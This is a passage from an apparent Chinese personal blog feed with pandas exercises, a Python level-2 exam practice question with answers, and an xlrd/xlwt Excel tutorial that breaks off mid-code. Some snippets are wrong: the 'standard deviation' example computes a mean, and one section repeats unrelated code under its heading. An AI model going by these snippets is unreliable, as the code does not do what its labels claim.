<h4 id="归一化dataframe的所有列"><a href="#归一化dataframe的所有列" class="headerlink" title="归一化dataframe的所有列"></a>归一化dataframe的所有列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">80</span>).reshape(<span class="number">8</span>, -<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正态分布归一化</span></span><br><span class="line">out1 = df.apply(<span class="keyword">lambda</span> x: ((x - x.mean())/x.std()).<span class="built_in">round</span>(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Solution Q1\n&#x27;</span>,out1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线性归一化</span></span><br><span class="line">out2 = df.apply(<span class="keyword">lambda</span> x: ((x.<span class="built_in">max</span>() - x)/(x.<span class="built_in">max</span>() - x.<span class="built_in">min</span>())).<span class="built_in">round</span>(<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Solution Q2\n&#x27;</span>, out2)</span><br></pre></td></tr></table></figure>

<h4 id="计算每一行与下一行的相关性"><a href="#计算每一行与下一行的相关性" class="headerlink" title="计算每一行与下一行的相关性"></a>计算每一行与下一行的相关性</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">25</span>).reshape(<span class="number">5</span>, -<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 行与行之间的相关性</span></span><br><span class="line">r = [df.iloc[i].corr(df.iloc[i+<span class="number">1</span>]).<span class="built_in">round</span>(<span class="number">2</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(df.shape[<span class="number">0</span>])[:-<span class="number">1</span>]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="用0赋值dataframe的主对角线和副对角线"><a href="#用0赋值dataframe的主对角线和副对角线" class="headerlink" title="用0赋值dataframe的主对角线和副对角线"></a>用0赋值dataframe的主对角线和副对角线</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>,<span class="number">100</span>, <span class="number">25</span>).reshape(<span class="number">5</span>, -<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(df.shape[<span class="number">0</span>]):</span><br><span class="line">    df.iat[i, i] = <span class="number">0</span></span><br><span class="line">    df.iat[df.shape[<span class="number">0</span>]-i-<span class="number">1</span>, i] = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="得到按列分组的dataframe的平均值和标准差"><a href="#得到按列分组的dataframe的平均值和标准差" class="headerlink" title="得到按列分组的dataframe的平均值和标准差"></a>得到按列分组的dataframe的平均值和标准差</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;col1&#x27;</span>: [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>] * <span class="number">2</span>,</span><br><span class="line">                   <span class="string">&#x27;col2&#x27;</span>: np.random.randint(<span class="number">0</span>,<span class="number">15</span>,<span class="number">6</span>),</span><br><span class="line">                   <span class="string">&#x27;col3&#x27;</span>: np.random.randint(<span class="number">0</span>, <span class="number">15</span>, <span class="number">6</span>)&#125;)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按列col1分组后的平均值</span></span><br><span class="line">df_grouped_mean = df.groupby([<span class="string">&#x27;col1&#x27;</span>]).mean()</span><br><span class="line"><span class="built_in">print</span>(df_grouped_mean)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按列col1分组后的标准差</span></span><br><span class="line">df_grouped_std = df.groupby([<span class="string">&#x27;col1&#x27;</span>]).mean()</span><br><span class="line"><span class="built_in">print</span>(df_grouped_std)</span><br></pre></td></tr></table></figure>

<h4 id="得到按列分组后另一列的第n大的值"><a href="#得到按列分组后另一列的第n大的值" class="headerlink" title="得到按列分组后另一列的第n大的值"></a>得到按列分组后另一列的第n大的值</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;fruit&#x27;</span>: [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>] * <span class="number">2</span>,</span><br><span class="line">                   <span class="string">&#x27;taste&#x27;</span>: np.random.rand(<span class="number">6</span>),</span><br><span class="line">                   <span class="string">&#x27;price&#x27;</span>: np.random.randint(<span class="number">0</span>, <span class="number">15</span>, <span class="number">6</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># teste列按fruit分组</span></span><br><span class="line">df_grpd = df[<span class="string">&#x27;taste&#x27;</span>].groupby(df.fruit)</span><br><span class="line"><span class="comment"># teste列中banana元素的信息</span></span><br><span class="line">x=df_grpd.get_group(<span class="string">&#x27;banana&#x27;</span>)</span><br><span class="line"><span class="comment"># 排序并找第2大的值</span></span><br><span class="line">s = x.sort_values().iloc[-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<h4 id="计算分组dataframe的平均值，并将分组列保留为另一列"><a href="#计算分组dataframe的平均值，并将分组列保留为另一列" class="headerlink" title="计算分组dataframe的平均值，并将分组列保留为另一列"></a>计算分组dataframe的平均值，并将分组列保留为另一列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(&#123;<span class="string">&#x27;fruit&#x27;</span>: [<span class="string">&#x27;apple&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>, <span class="string">&#x27;orange&#x27;</span>] * <span class="number">2</span>,</span><br><span class="line">                   <span class="string">&#x27;taste&#x27;</span>: np.random.rand(<span class="number">6</span>),</span><br><span class="line">                   <span class="string">&#x27;price&#x27;</span>: np.random.randint(<span class="number">0</span>, <span class="number">15</span>, <span class="number">6</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># teste列按fruit分组</span></span><br><span class="line">df_grpd = df[<span class="string">&#x27;taste&#x27;</span>].groupby(df.fruit)</span><br><span class="line"><span class="comment"># teste列中banana元素的信息</span></span><br><span class="line">x=df_grpd.get_group(<span class="string">&#x27;banana&#x27;</span>)</span><br><span class="line"><span class="comment"># 排序并找第2大的值</span></span><br><span class="line">s = x.sort_values().iloc[-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>

<h4 id="创建指定列偏移后的新列"><a href="#创建指定列偏移后的新列" class="headerlink" title="创建指定列偏移后的新列"></a>创建指定列偏移后的新列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>, <span class="number">100</span>, <span class="number">20</span>).reshape(-<span class="number">1</span>, <span class="number">4</span>), columns = <span class="built_in">list</span>(<span class="string">&#x27;abcd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建往下偏移后的列</span></span><br><span class="line">df[<span class="string">&#x27;a_lag1&#x27;</span>] = df[<span class="string">&#x27;a&#x27;</span>].shift(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># 创建往上偏移后的列</span></span><br><span class="line">df[<span class="string">&#x27;b_lead1&#x27;</span>] = df[<span class="string">&#x27;b&#x27;</span>].shift(-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(df)</span><br></pre></td></tr></table></figure>

<h4 id="获得dataframe中单一值的频数"><a href="#获得dataframe中单一值的频数" class="headerlink" title="获得dataframe中单一值的频数"></a>获得dataframe中单一值的频数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame(np.random.randint(<span class="number">1</span>, <span class="number">10</span>, <span class="number">20</span>).reshape(-<span class="number">1</span>, <span class="number">4</span>), columns = <span class="built_in">list</span>(<span class="string">&#x27;abcd&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计元素值的个数</span></span><br><span class="line">r = pd.value_counts(df.values.ravel())</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<h4 id="将文本拆分为两个单独的列"><a href="#将文本拆分为两个单独的列" class="headerlink" title="将文本拆分为两个单独的列"></a>将文本拆分为两个单独的列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">df = pd.DataFrame([<span class="string">&quot;STD, City    State&quot;</span>,</span><br><span class="line"><span class="string">&quot;33, Kolkata    West Bengal&quot;</span>,</span><br><span class="line"><span class="string">&quot;44, Chennai    Tamil Nadu&quot;</span>,</span><br><span class="line"><span class="string">&quot;40, Hyderabad    Telengana&quot;</span>,</span><br><span class="line"><span class="string">&quot;80, Bangalore    Karnataka&quot;</span>], columns=[<span class="string">&#x27;row&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"><span class="comment"># expand=True表示以分割符把字符串分成两列</span></span><br><span class="line">df_out = df.row.<span class="built_in">str</span>.split(<span class="string">&#x27;,|\t&#x27;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取新的列</span></span><br><span class="line">new_header = df_out.iloc[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 重新赋值</span></span><br><span class="line">df_out = df_out[<span class="number">1</span>:]</span><br><span class="line">df_out.columns = new_header</span><br><span class="line"><span class="built_in">print</span>(df_out)</span><br></pre></td></tr></table></figure>

<h4 id="构建多级索引的dataframe"><a href="#构建多级索引的dataframe" class="headerlink" title="构建多级索引的dataframe"></a>构建多级索引的dataframe</h4><p>利用元组（Tuple）构建多级索引，然后定义dataframe</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line">outside = [<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;B&#x27;</span>]</span><br><span class="line">inside =[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">my_index = <span class="built_in">list</span>(<span class="built_in">zip</span>(outside,inside))</span><br><span class="line"><span class="comment"># my_index</span></span><br><span class="line"><span class="comment"># 转化为pd格式的索引</span></span><br><span class="line">my_index = pd.MultiIndex.from_tuples(my_index)</span><br><span class="line"><span class="comment"># my_index</span></span><br><span class="line"><span class="comment"># 构建多级索引dataframe</span></span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">6</span>,<span class="number">2</span>),index =my_index,columns=[<span class="string">&#x27;fea1&#x27;</span>,<span class="string">&#x27;fea2&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(df)</span><br><span class="line"></span><br><span class="line">r = df.loc[<span class="string">&#x27;A&#x27;</span>].iloc[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>



<p>参考博客：<a href="https://blog.csdn.net/weixin_44489066/article/details/89494395">https://blog.csdn.net/weixin_44489066/article/details/89494395</a></p>
]]></content>
      <categories>
        <category>高处相见</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>数据处理</tag>
        <tag>pandas</tag>
      </tags>
  </entry>
  <entry>
    <title>python二级--练习题</title>
    <url>/2020/02/07/python%E4%BA%8C%E7%BA%A7-%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<h3 id="题目要求"><a href="#题目要求" class="headerlink" title="题目要求"></a>题目要求</h3><p>键盘输入某班各个同学就业的行业名称，行业名称之间用空格间隔（回车结束输入）。完善python代码，统计各行业就业的学生数量，按照数量从高到低方式输出。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下代码为提示框架</span></span><br><span class="line"><span class="comment"># 请在...处使用一行或多行代码替换</span></span><br><span class="line"><span class="comment"># 请在______处使用一行代码替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：提示框架代码可以任意修改，以完成程序功能为准</span></span><br><span class="line"></span><br><span class="line">names=<span class="built_in">input</span>(<span class="string">&quot;请输入各个同学行业名称，行业名称之间用空格间隔（回车结束输入）：&quot;</span>)</span><br><span class="line">...</span><br><span class="line">d = &#123;&#125;</span><br><span class="line">...</span><br><span class="line">ls = <span class="built_in">list</span>(d.items())</span><br><span class="line">ls.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># 按照数量排序</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ls:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(______))</span><br></pre></td></tr></table></figure>

<p>我的答案如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">names=<span class="built_in">input</span>(<span class="string">&quot;请输入各个同学行业名称，行业名称之间用空格间隔（回车结束输入）：&quot;</span>)</span><br><span class="line">total = names.split()</span><br><span class="line">total_quchong = <span class="built_in">set</span>(total)</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> total_quchong:</span><br><span class="line">    d[i] = total.count(i)</span><br><span class="line"></span><br><span class="line">ls = <span class="built_in">list</span>(d.items())</span><br><span class="line">ls.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ls:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(k[<span class="number">0</span>],k[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>思路：首先利用set()元组化来去重复，以此来利用count（）获取列表每类重复的数量。并将其填入字典。<br>利用sort()来以第二个元素为key来排序。</p>
<p>lambda是个简易的函数。此处是为了获取第二个元素。</p>
<p>官方答案：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 以下代码为提示框架</span></span><br><span class="line"><span class="comment"># 请在...处使用一行或多行代码替换</span></span><br><span class="line"><span class="comment"># 请在______处使用一行代码替换</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 注意：提示框架代码可以任意修改，以完成程序功能为准</span></span><br><span class="line"></span><br><span class="line">names=<span class="built_in">input</span>(<span class="string">&quot;请输入各个同学行业名称，行业名称之间用空格间隔（回车结束输入）：&quot;</span>)</span><br><span class="line">t=names.split()</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(t)):</span><br><span class="line">    d[t[c]]=d.get(t[c],<span class="number">0</span>)+<span class="number">1</span></span><br><span class="line">ls = <span class="built_in">list</span>(d.items())</span><br><span class="line">ls.sort(key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>], reverse=<span class="literal">True</span>) <span class="comment"># 按照数量排序</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ls)):</span><br><span class="line">    zy,num=ls[k]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(zy,num))</span><br></pre></td></tr></table></figure>

<p>答案思路更加简洁，只利用获取字典的键值来实现累加！    </p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python二级</tag>
        <tag>py练习题</tag>
      </tags>
  </entry>
  <entry>
    <title>python处理excel表格</title>
    <url>/2020/02/18/python%E5%A4%84%E7%90%86excel%E8%A1%A8%E6%A0%BC/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>

<p>正好遇到一个excel的小任务，用python可以进行简单处理</p>
<h3 id="安装三个库"><a href="#安装三个库" class="headerlink" title="安装三个库"></a>安装三个库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install xlrd #读取excel</span><br><span class="line">pip install xlwt #写excel</span><br><span class="line">pip install xlutils #常用将读取对象转为可写对象</span><br></pre></td></tr></table></figure>


<h3 id="xlrd常用命令（读取）"><a href="#xlrd常用命令（读取）" class="headerlink" title="xlrd常用命令（读取）"></a>xlrd常用命令（读取）</h3><h4 id="读取excel文件："><a href="#读取excel文件：" class="headerlink" title="读取excel文件："></a>读取excel文件：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data= xlrd.open_workbook(test.xls)</span><br></pre></td></tr></table></figure>
<h4 id="读取表："><a href="#读取表：" class="headerlink" title="读取表："></a>读取表：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = data.sheets()[<span class="number">0</span>] <span class="comment">#通过索引顺序读取</span></span><br><span class="line"></span><br><span class="line">table = data.sheet_by_index(<span class="number">0</span>)) <span class="comment">#通过索引顺序读取</span></span><br><span class="line"></span><br><span class="line">table = data.sheet_by_name(<span class="string">&quot;Sheet1&quot;</span>) <span class="comment">#通过表名读取</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sheet名</span></span><br><span class="line">table.name</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sheet列数</span></span><br><span class="line">table.ncols</span><br><span class="line">    </span><br><span class="line"><span class="comment"># sheet行数</span></span><br><span class="line">table.nrows</span><br></pre></td></tr></table></figure>

<h4 id="读取表的行与列"><a href="#读取表的行与列" class="headerlink" title="读取表的行与列"></a>读取表的行与列</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table.row(<span class="number">0</span>) <span class="comment">#返回由0行中所有的单元格对象（包含类型和值）组成的列表</span></span><br><span class="line"></span><br><span class="line">table.row(<span class="number">0</span>)[<span class="number">0</span>].ctype <span class="comment">#返回第一行第一个单元格的类型</span></span><br><span class="line"></span><br><span class="line">table.row(<span class="number">0</span>)[<span class="number">0</span>].value <span class="comment">#返回第一行第一个单元格的值</span></span><br><span class="line"></span><br><span class="line">table.row_slice(self, <span class="number">0</span>, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>) <span class="comment">#返回由第一行中所有的单元格对象组成的列表</span></span><br><span class="line"></span><br><span class="line">table.row_types(<span class="number">0</span>, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>) <span class="comment">#返回由第一行中所有单元格的数据类型组成的列表</span></span><br><span class="line"></span><br><span class="line">table.row_values(<span class="number">0</span>, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>) <span class="comment">#返回由第一行中所有单元格的数据组成的列表</span></span><br><span class="line"></span><br><span class="line">table.row_len(<span class="number">0</span>) <span class="comment">#返回第一行的有效单元格长度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#返回第二列中所有的单元格对象组成的列表</span></span><br><span class="line">table.col(<span class="number">1</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)  </span><br><span class="line">    </span><br><span class="line"><span class="comment">#返回第二列中所有的单元格对象组成的列表</span></span><br><span class="line">table.col_slice(<span class="number">1</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>)  </span><br><span class="line">    </span><br><span class="line"><span class="comment">#返回第二列中所有单元格的数据类型组成的列表</span></span><br><span class="line">table.col_types(<span class="number">1</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>) </span><br><span class="line">    </span><br><span class="line"><span class="comment">#返回第二列中所有单元格的数据组成的列表</span></span><br><span class="line">table.col_values(<span class="number">1</span>, start_rowx=<span class="number">0</span>, end_rowx=<span class="literal">None</span>) </span><br></pre></td></tr></table></figure>

<h4 id="读取表中某一个单元格"><a href="#读取表中某一个单元格" class="headerlink" title="读取表中某一个单元格"></a>读取表中某一个单元格</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回单元格对象</span></span><br><span class="line">cell = table.cell(rowx,colx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单元格数据类型</span></span><br><span class="line"><span class="comment"># 0. empty（空的）,1 string（text）, 2 number, 3 date, 4 boolean, 5 error， 6 blank（空白表格）</span></span><br><span class="line">cell.ctype</span><br><span class="line"></span><br><span class="line"><span class="comment"># 单元格值</span></span><br><span class="line">cell.value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回单元格中的数据类型</span></span><br><span class="line">table.cell_type(rowx,colx)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回单元格中的数据</span></span><br><span class="line">table.cell_value(rowx,colx)</span><br></pre></td></tr></table></figure>


<h3 id="xlwt常用命令（写入）"><a href="#xlwt常用命令（写入）" class="headerlink" title="xlwt常用命令（写入）"></a>xlwt常用命令（写入）</h3><h4 id="写入excel"><a href="#写入excel" class="headerlink" title="写入excel"></a>写入excel</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一张空表</span></span><br><span class="line">workbook = xlwt.Workbook(encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 创建一个sheet</span></span><br><span class="line">worksheet = workbook.add_sheet(<span class="string">&#x27;sheet&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一个已存在的sheet</span></span><br><span class="line">worksheet = workbook.get_sheet(<span class="string">&#x27;sheet&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 写入一个值，括号内分别为行数、列数、内容</span></span><br><span class="line">worksheet.write(row, column, <span class="string">&quot;memeda&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存 </span></span><br><span class="line">workbook.save(<span class="string">&#x27;gzy.xls&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="带样式写入例子"><a href="#带样式写入例子" class="headerlink" title="带样式写入例子"></a>带样式写入例子</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">workbook = xlwt.Workbook(encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">style = xlwt.XFStyle()</span><br><span class="line">font = xlwt.Font() <span class="comment"># 创建字体</span></span><br><span class="line">font.name = <span class="string">&#x27;Arial&#x27;</span></span><br><span class="line">font.bold = <span class="literal">True</span> <span class="comment"># 黑体</span></span><br><span class="line">font.underline = <span class="literal">True</span> <span class="comment"># 下划线</span></span><br><span class="line">font.italic = <span class="literal">True</span> <span class="comment"># 斜体字</span></span><br><span class="line">font.colour_index = <span class="number">2</span> <span class="comment"># 颜色为红色</span></span><br><span class="line">style.font = font</span><br><span class="line">worksheet.write(row, column, <span class="string">&quot;memeda&quot;</span>, style)</span><br><span class="line">workbook.save(<span class="string">&#x27;gzy.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h4 id="输出多种颜色字体"><a href="#输出多种颜色字体" class="headerlink" title="输出多种颜色字体"></a>输出多种颜色字体</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">workbook = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_style</span>(<span class="params">i</span>):</span></span><br><span class="line">    style = xlwt.XFStyle()</span><br><span class="line">    font = xlwt.Font()  <span class="comment"># 创建字体</span></span><br><span class="line">    font.colour_index = i</span><br><span class="line">    style.font = font</span><br><span class="line">    <span class="keyword">return</span> style</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">sheet = workbook.add_sheet(<span class="string">&quot;memeda&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    sheet.write(i, <span class="number">0</span>, <span class="string">&quot;memeda&quot;</span>, get_style(i))</span><br><span class="line">workbook.save(<span class="string">&#x27;memeda.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="其他的注意事项"><a href="#其他的注意事项" class="headerlink" title="其他的注意事项"></a>其他的注意事项</h3><p>涉及表格的列的时候，不能用ABCDEFG等索引，应该用数字索引，而且从0开始</p>
<h3 id="解决实际问题"><a href="#解决实际问题" class="headerlink" title="解决实际问题"></a>解决实际问题</h3><p>一个表中的两列数据为两个城市（f的范围小，g的范围大），挑选出不是一个城市的并生成表格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data = xlrd.open_workbook(<span class="string">&quot;侦查系学生返校信息统计表(1)(3).xls&quot;</span>)</span><br><span class="line"></span><br><span class="line">table = data.sheet_by_name(<span class="string">&quot;Sheet1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">workbook = xlwt.Workbook(encoding = <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">worksheet = workbook.add_sheet(<span class="string">&#x27;gzy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1880</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (table.col(<span class="number">6</span>)[i].value <span class="keyword">in</span> table.col(<span class="number">5</span>)[i].value):</span><br><span class="line"></span><br><span class="line">        <span class="comment">#if not (&quot;济南&quot; in table.col(6)[i].value):</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        l = table.row_values(i, start_colx=<span class="number">0</span>, end_colx=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(l)):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            worksheet.write(n, j, l[j])</span><br><span class="line"></span><br><span class="line">        n += <span class="number">1</span>  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">workbook.save(<span class="string">&#x27;gzy.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>另外补充一下python处理txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"></span><br><span class="line">filetxt = <span class="string">&#x27;19级可能出现异常的行数.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">data = xlrd.open_workbook(<span class="string">&quot;zcx19.xlsx&quot;</span>)</span><br><span class="line"></span><br><span class="line">table = data.sheet_by_name(<span class="string">&quot;Sheet1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">464</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (table.col(<span class="number">6</span>)[i].value <span class="keyword">in</span> table.col(<span class="number">5</span>)[i].value):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (<span class="string">&quot;济南&quot;</span> <span class="keyword">in</span> table.col(<span class="number">6</span>)[i].value):</span><br><span class="line"></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(filetxt, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> file_object:</span><br><span class="line"></span><br><span 